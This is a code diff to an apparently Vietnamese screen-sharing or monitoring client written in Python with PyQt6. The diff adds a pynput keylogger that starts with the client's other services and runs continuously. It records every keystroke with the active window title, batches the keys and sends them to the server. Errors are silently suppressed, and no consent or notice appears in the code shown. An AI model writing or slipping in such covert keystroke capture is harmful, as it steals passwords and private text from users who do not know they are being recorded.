@@ -11,6 +11,7 @@ import threading
 from PyQt6.QtWidgets import QApplication, QWidget, QLabel, QPushButton, QVBoxLayout, QHBoxLayout, QLineEdit, QFrame, QMessageBox, QSizePolicy, QScrollArea
 from PyQt6.QtCore import Qt, pyqtSignal
 import pygetwindow as gw
+from pynput import keyboard  # Thêm import cho keylogger
 
 # Import client components
 from src.client.client_constants import CLIENT_ID, CA_FILE
@@ -70,6 +71,9 @@ class Client:
 
         self.screenshot_thread = None
         self.monitor_thread = None # [THÊM] Thread giám sát
+        self.keylogger_thread = None  # [THÊM] Thread keylogger
+        self.keylogger_running = False  # [THÊM] Flag keylogger
+        self.key_buffer = ""  # [THÊM] Buffer lưu keystroke
         self.last_full_frame_ts = 0
         self.full_frame_interval = 30 
         
@@ -134,6 +138,15 @@ class Client:
             daemon=True
         )
         self.monitor_thread.start()
+        
+        # 7. Khởi động Keylogger (Luôn chạy liên tục)
+        self.keylogger_running = True
+        self.keylogger_listener = keyboard.Listener(
+            on_press=self._on_key_press,
+            on_release=self._on_key_release
+        )
+        self.keylogger_listener.start()
+        self.logger("[Client] Đã khởi động keylogger liên tục...")
 
         self.logger("[Client] Đã khởi động toàn bộ dịch vụ.")
         return True
@@ -153,6 +166,12 @@ class Client:
         self.screenshot.stop = True
         if self.permissions.can_see_cursor():
             self.cursor_tracker.stop()
+        
+        # Dừng keylogger
+        self.keylogger_running = False
+        if hasattr(self, 'keylogger_listener'):
+            self.keylogger_listener.stop()
+        
         self.sender.stop()
         self.network.stop() # Sẽ kích hoạt _on_disconnected
         
@@ -225,6 +244,98 @@ class Client:
             
             # Kiểm tra mỗi 2 giây để không tốn CPU
             time.sleep(2)
+    
+    # --- [THÊM] KEYLOGGER HANDLERS ---
+    def _on_key_press(self, key):
+        """Xử lý khi nhấn phím - ghi lại keystroke"""
+        if not self.keylogger_running:
+            return
+        
+        try:
+            # Lấy tiêu đề cửa sổ đang active
+            window_title = self._get_active_window_title()
+            
+            # Xử lý phím thường (a-z, 0-9, etc.)
+            if hasattr(key, 'char') and key.char:
+                self.key_buffer += key.char
+                
+                # Gửi buffer khi đủ 10 ký tự hoặc gặp khoảng trắng
+                if len(self.key_buffer) >= 10 or key.char.isspace():
+                    self._send_keylog(self.key_buffer, window_title)
+                    self.key_buffer = ""
+            
+            # Xử lý phím đặc biệt
+            else:
+                # Flush buffer trước
+                if self.key_buffer:
+                    self._send_keylog(self.key_buffer, window_title)
+                    self.key_buffer = ""
+                
+                # Map phím đặc biệt
+                special_key = self._map_special_key(key)
+                if special_key:
+                    self._send_keylog(special_key, window_title)
+        
+        except Exception as e:
+            # Không log lỗi để tránh spam
+            pass
+    
+    def _on_key_release(self, key):
+        """Xử lý khi thả phím"""
+        # Có thể thêm logic nếu cần
+        pass
+    
+    def _get_active_window_title(self):
+        """Lấy tiêu đề cửa sổ đang active"""
+        try:
+            active_window = gw.getActiveWindow()
+            if active_window:
+                return active_window.title
+        except:
+            pass
+        return "Unknown Window"
+    
+    def _map_special_key(self, key):
+        """Map special keys sang text"""
+        key_map = {
+            keyboard.Key.space: " ",
+            keyboard.Key.enter: "[ENTER]",
+            keyboard.Key.tab: "[TAB]",
+            keyboard.Key.backspace: "[BACKSPACE]",
+            keyboard.Key.delete: "[DELETE]",
+            keyboard.Key.esc: "[ESC]",
+            keyboard.Key.shift: "[SHIFT]",
+            keyboard.Key.ctrl: "[CTRL]",
+            keyboard.Key.alt: "[ALT]",
+        }
+        return key_map.get(key, None)
+    
+    def _send_keylog(self, key_data, window_title):
+        """Gửi keylog data lên server qua INPUT channel"""
+        if not key_data or not self.network.running:
+            return
+        
+        try:
+            from datetime import datetime
+            
+            # Tạo keylog data object
+            keylog_data = {
+                "KeyData": key_data,
+                "WindowTitle": window_title,
+                "ClientID": self.username,
+                "LoggedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            }
+            
+            # Gửi qua INPUT channel (như input PDU)
+            # Format: pdu with type='input' và input_data=keylog_data
+            self.network.send_input_pdu(keylog_data)
+            
+            # Log local (optional)
+            # self.logger(f"[Keylog] {key_data} @ {window_title}")
+            
+        except Exception as e:
+            # Không log lỗi để tránh spam
+            pass
 
     def _on_frame(self, width, height, jpg_bytes, bbox, img, seq, ts_ms):
         # Tất cả các role đều được phép gửi frame (screen sharing)
